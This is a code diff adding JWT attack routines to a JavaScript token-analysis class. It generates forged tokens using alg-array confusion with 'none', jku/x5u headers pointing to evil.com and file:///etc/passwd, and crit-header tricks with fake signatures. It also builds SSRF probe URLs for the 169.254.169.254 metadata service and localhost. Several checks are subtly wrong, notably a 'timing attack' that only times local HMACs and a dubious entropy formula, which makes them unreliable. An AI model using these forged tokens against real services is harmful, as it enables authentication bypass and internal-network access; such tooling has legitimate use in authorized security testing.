@@ -167,7 +167,116 @@ class TokenAnalyzer {
     return buf.toString('base64url');
   }
 
-  sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+  async testAlgorithmArrayConfusion(token) {
+    const parts = token.split('.');
+    if (parts.length !== 3) return { vulnerable: false };
+    const payload = parts[1];
+    const attacks = [
+      { header: JSON.stringify({ alg: ['HS256', 'none'], typ: 'JWT' }), name: 'alg as array [HS256, none]' },
+      { header: JSON.stringify({ alg: ['none', 'HS256'], typ: 'JWT' }), name: 'alg as array [none, HS256]' },
+      { header: JSON.stringify({ alg: '["none","HS256"]', typ: 'JWT' }), name: 'alg as stringified array' }
+    ];
+    return attacks.map(a => ({
+      name: a.name,
+      token: [Buffer.from(a.header).toString('base64url'), payload, parts[2]].join('.')
+    }));
+  }
+
+  async testTimingAttack(token, secret) {
+    const parts = token.split('.');
+    const results = [];
+    for (let len = 1; len <= Math.min(secret.length, 20); len++) {
+      const partial = secret.slice(0, len);
+      const start = Date.now();
+      const hmac = crypto.createHmac('sha256', partial);
+      hmac.update(`${parts[0]}.${parts[1]}`);
+      hmac.digest();
+      results.push({ len, elapsed: Date.now() - start });
+    }
+    return results;
+  }
+
+  async testTokenReplay(token) {
+    const decoded = this.decodeJWT(token);
+    if (!decoded.valid || !decoded.payload.jti) return { replayable: true, reason: 'No jti claim — no replay protection' };
+    return { replayable: false, jti: decoded.payload.jti };
+  }
+
+  async testTokenInURL() {
+    return { note: 'Check browser URL bar for tokens in hash/fragment — common in OAuth flows' };
+  }
+
+  async testTokenGenerationEntropy(samples = []) {
+    if (samples.length < 2) return { error: 'Need at least 2 samples' };
+    const unique = new Set(samples);
+    const entropy = Math.log2(unique.size) / samples.length;
+    return { samples: samples.length, uniqueTokens: unique.size, entropyRatio: entropy, weak: entropy < 0.5 };
+  }
+
+  async testJKUInjection(token) {
+    const parts = token.split('.');
+    const payload = parts[1];
+    const urls = ['https://evil.com/jwk.json', 'http://localhost:8080/jwk', 'data:application/json;base64,'];
+    return urls.map(url => {
+      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT', jku: url })).toString('base64url');
+      return { jku: url, token: `${header}.${payload}.${parts[2]}` };
+    });
+  }
+
+  async testX5UInjection(token) {
+    const parts = token.split('.');
+    const payload = parts[1];
+    const urls = ['https://evil.com/cert.pem', 'http://localhost:8080/cert', 'file:///etc/passwd'];
+    return urls.map(url => {
+      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT', x5u: url })).toString('base64url');
+      return { x5u: url, token: `${header}.${payload}.${parts[2]}` };
+    });
+  }
+
+  async testCritHeader(token) {
+    const parts = token.split('.');
+    const payload = parts[1];
+    const attacks = [
+      { header: JSON.stringify({ alg: 'none', typ: 'JWT', crit: ['alg'] }), name: 'crit includes alg' },
+      { header: JSON.stringify({ alg: 'HS256', typ: 'JWT', crit: [] }), name: 'empty crit array' },
+      { header: JSON.stringify({ alg: 'HS256', typ: 'JWT', crit: ['nonexistent'] }), name: 'crit with unknown param' }
+    ];
+    return attacks.map(a => ({
+      name: a.name,
+      token: [Buffer.from(a.header).toString('base64url'), payload, 'FAKE_SIG'].join('.')
+    }));
+  }
+
+  async testSubClaimSSRF(token) {
+    const decoded = this.decodeJWT(token);
+    if (!decoded.valid || !decoded.payload.sub) return [];
+    const sub = decoded.payload.sub;
+    const urls = ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080/', 'http://[::1]:22/'];
+    if (sub.startsWith('http')) return urls.map(u => ({ originalSub: sub, testUrl: u }));
+    return [];
+  }
+
+  async fullTokenAudit(token) {
+    console.log('[TokenAnalyzer] Full token audit...');
+    const analysis = this.analyzeToken(token);
+    const expCheck = await this.checkExpiration(token);
+    const algNone = await this.testAlgNone(token);
+    const keyword = await this.testJKUInjection(token);
+    const x5u = await this.testX5UInjection(token);
+    const critTests = await this.testCritHeader(token);
+    const replayCheck = await this.testTokenReplay(token);
+    const kidInjection = await this.testKidInjection(token);
+    return {
+      ...analysis,
+      expiration: expCheck,
+      algNoneBypass: algNone,
+      jkuInjection: keyword,
+      x5uInjection: x5u,
+      critTests,
+      replayProtection: replayCheck,
+      kidInjection
+    };
+  }
 }
 
 module.exports = { TokenAnalyzer };
